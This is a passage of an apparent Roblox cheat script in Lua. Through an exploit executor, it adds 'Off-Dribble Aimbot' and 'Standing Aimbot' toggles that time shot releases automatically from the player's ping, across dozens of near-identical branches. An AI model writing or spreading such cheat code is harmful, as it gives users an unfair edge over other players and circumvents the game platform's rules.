                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 135 then
                    print("135 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping135 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.51)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 130 then
                    print("130 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping130 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.51)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 125 then
                    print("125 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping125 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.51)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 120 then
                    print("120 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping120 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.515)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 115 then
                    print("115 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping90 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.53)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 110 then
                    print("110 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping110 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.53)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 105 then
                    print("105 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping105 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.545)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 100 then
                    print("100 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping100 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.55)-- default
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 95 then
                    print("95 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping95 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.558)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 90 then
                    print("90 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping90 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.558)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 85 then
                    print("85 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping85 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.57)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 80 then
                    print("80 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping80 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.57)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 75 then
                    print("75 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping75 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.57)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 70 then
                    print("70 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping70 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.57)-- default 52
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 65 then
                    print("65 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping65 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.565)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 60 then
                    print("60 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping60 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.563)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                --end)
                end
            
            end
            if Toggles.offdribbleaimbot.Value == false then
                local ping = nil
                getgenv().ping305 = false
                getgenv().ping300 = false
                getgenv().ping295 = false
                getgenv().ping290 = false
                getgenv().ping285 = false
                getgenv().ping280 = false
                getgenv().ping275 = false
                getgenv().ping270 = false
                getgenv().ping265 = false
                getgenv().ping260 = false
                getgenv().ping255 = false
                getgenv().ping250 = false
                getgenv().ping245 = false
                getgenv().ping240 = false
                getgenv().ping235 = false
                getgenv().ping230 = false
                getgenv().ping225 = false
                getgenv().ping220 = false
                getgenv().ping215 = false
                getgenv().ping210 = false
                getgenv().ping205 = false
                getgenv().ping200 = false
                getgenv().ping195 = false
                getgenv().ping190 = false
                getgenv().ping185 = false
                getgenv().ping180 = false
                getgenv().ping175 = false
                getgenv().ping170 = false
                getgenv().ping165 = false
                getgenv().ping160 = false
                getgenv().ping155 = false
                getgenv().ping150 = false
                getgenv().ping145 = false
                getgenv().ping140 = false
                getgenv().ping135 = false
                getgenv().ping130 = false
                getgenv().ping125 = false
                getgenv().ping120 = false
                getgenv().ping115 = false
                getgenv().ping110 = false
                getgenv().ping105 = false
                getgenv().ping100 = false
                getgenv().ping95 = false
                getgenv().ping90 = false
                getgenv().ping85 = false
                getgenv().ping80 = false
                getgenv().ping75 = false
                getgenv().ping70 = false
                getgenv().ping65 = false
                getgenv().ping60 = false
            end
        end)
        
        
        Toggles.offdribbleaimbot:SetValue(false)
        
        LeftGroupBox:AddToggle('standingaimbot', {
            Text = 'Standing Aimbot',
            Default = false,
            Tooltip = 'With this if you press [E] only in a standing shot.\nUse if your ping is stable as this script\ndetects your ping to time depending on your ping.\nAvailable: [STANDING SHOOT] [HOPSTEP-OFFDRIBLE]' -- Information shown when you hover over the toggle
        })
        
        Toggles.standingaimbot:OnChanged(function()
            if Toggles.standingaimbot.Value == true then
                local char = game:GetService("Players").LocalPlayer.Character or
                    game:GetService("Players").LocalPlayer.CharacterAdded
                local Humanoid = char:FindFirstChild("Humanoid")
                local StandingAnim = game.Players.LocalPlayer.Character.Humanoid.Animations.ShotRelease.AnimationId
                local pingvalue = nil
                local split = nil
                local ping = nil
                pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                split = string.split(pingvalue, '(')
                ping = tonumber(split[1])
                getgenv().ping305 = true
                getgenv().ping300 = true
                getgenv().ping295 = true
                getgenv().ping290 = true
                getgenv().ping285 = true
                getgenv().ping280 = true
                getgenv().ping275 = true
                getgenv().ping270 = true
                getgenv().ping265 = true
                getgenv().ping260 = true
                getgenv().ping255 = true
                getgenv().ping250 = true
                getgenv().ping245 = true
                getgenv().ping240 = true
                getgenv().ping235 = true
                getgenv().ping230 = true
                getgenv().ping225 = true
                getgenv().ping220 = true
                getgenv().ping215 = true
                getgenv().ping210 = true
                getgenv().ping205 = true
                getgenv().ping200 = true
                getgenv().ping195 = true
                getgenv().ping190 = true
                getgenv().ping185 = true
                getgenv().ping180 = true
                getgenv().ping175 = true
                getgenv().ping170 = true
                getgenv().ping165 = true
                getgenv().ping160 = true
                getgenv().ping155 = true
                getgenv().ping150 = true
                getgenv().ping145 = true
                getgenv().ping140 = true
                getgenv().ping135 = true
                getgenv().ping130 = true
                getgenv().ping125 = true
                getgenv().ping120 = true
                getgenv().ping115 = true
                getgenv().ping110 = true
                getgenv().ping105 = true
                getgenv().ping100 = true
                getgenv().ping95 = true
                getgenv().ping90 = true
                getgenv().ping85 = true
                getgenv().ping80 = true
                getgenv().ping75 = true
                getgenv().ping70 = true
                getgenv().ping65 = true
                getgenv().ping60 = true
                
                if ping > 305 then
                    print("305 ms")
                    while getgenv().ping305 == true do wait()
                        --game:GetService("RunService").RenderStepped:Connect(function()
                        task.wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    if Toggles.standingaimbot.Value == true then
                                        Library:Notify("Release" ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                        wait(0.274)
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    --end)
                    end
                
                
                elseif ping > 300 then
                    print("300 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping300 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.28)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 295 then
                    print("295 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping295 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.29)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 290 then
                    print("290 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping290 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.31)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 285 then
                    print("285 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping285 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.32)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 280 then
                    print("280 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping280 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.33)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 275 then
                    print("275 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping275 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.33)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 270 then
                    print("270 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping270 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.34)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 265 then
                    print("265 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping265 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.34)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 260 then
                    print("260 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping260 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.334)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 255 then
                    print("255 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping255 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.334)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 250 then
                    print("250 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping250 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.35)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 245 then
                    print("245 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping245 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.35)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 240 then
                    print("240 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping240 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.36)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 235 then
                    print("235 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping235 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.36)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 230 then
                    print("230 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping230 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.36)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 225 then
                    print("225 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping225 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.37)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 220 then
                    print("220 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping220 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.37)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 215 then
                    print("215 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping215 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.37)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 210 then
                    print("210 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping210 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.38)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 205 then
                    print("205 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping205 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.38)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 200 then
                    print("200 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping200 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.385)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 195 then
                    print("195 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping195 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.4)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 190 then
                    print("190 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping190 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.41)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 185 then
                    print("185 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping185 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.42)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 180 then
                    print("180 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping180 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.43)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 175 then
                    print("175 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping175 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.435)
